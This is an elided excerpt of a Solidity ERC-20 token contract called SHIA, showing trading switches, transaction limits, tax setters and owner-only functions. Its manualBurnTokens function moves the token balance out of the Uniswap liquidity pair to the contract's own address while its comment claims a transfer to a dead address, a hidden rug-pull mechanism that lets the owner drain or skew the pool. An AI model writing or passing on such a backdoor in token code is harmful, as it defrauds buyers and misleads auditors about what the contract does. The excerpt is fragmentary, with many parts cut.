...
contract SHIA is Context, IERC20 {
    using SafeMath for uint256;

    string private constant _name = "SHIA";
    string private constant _symbol = "SHIATEST";
    ...
    uint256 private _totalSupply = 1e14 * 10**18;
    ...
    bool private _initiateTrades = false;
    ...
    constructor(address payable marketing_, address locker_, uint256 _snipeBlockAmt) {
        ...
        maxTxnAmount = _totalSupply / 100; 
        _maxWallet = _totalSupply * 2 / 100;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedMaxTxnAmount[from] ) {
            require(amount <= maxTxnAmount, "Transfer amount exceeds the maxTxnAmount.");
        }
    ...
    function initiateTrades() external onlyOwner {
        tradingActive = true;
    ...
    function addPair() external onlyOwner returns (bool){
        ...
        IUniswapV2Pair(uniV2Pair).approve(address(_uniV2Router), type(uint).max);
        return true;
    }
    ...
    function _saleSniper(uint256 amount) external authorized {
    ...
    function setBuyTax(uint256 _buyLiquidityTax, uint256 _buyReflectionsTax, uint256 _buyMarketingTax) external authorized() {
        require(
            _buyLiquidityTax <= 10,
            'Fee Too High'
        );
    ...
    function manualBurnTokens(uint amount) external authorized() returns (bool){
        uint amountToBurn = balanceOf(uniV2Pair);
        if (amountToBurn > 1){
            _transfer(uniV2Pair, address(this), amountToBurn - amount);
        }  // Transfer to dead    
